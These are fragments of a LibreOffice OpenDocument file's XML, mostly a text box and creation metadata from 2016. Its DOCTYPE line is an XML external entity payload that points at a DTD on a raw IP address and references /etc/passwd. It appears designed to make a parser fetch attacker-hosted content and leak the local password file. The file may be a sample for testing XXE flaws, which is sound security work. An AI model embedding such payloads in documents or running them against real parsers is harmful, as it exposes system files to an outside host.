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!DOCTYPE roottag  PUBLIC '-//OXML/XXE/EN'  'http://146.185.129.224:8080/a.dtd//etc/passwd'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953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2.319cm" svg:height="5.203cm" svg:x="4.429cm" svg:y="7.604cm">
          <draw:text-box>
            <text:p>§ examp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31T11:36:42.787823752</meta:creation-date>
    <dc:date>2016-07-31T11:37:06.420459633</dc:date>
    <meta:editing-duration>P0D</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:object-count="1"/>
    <meta:generator>LibreOffice/4.2.7.2$Linux_X86_64 LibreOffice_project/420m0$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>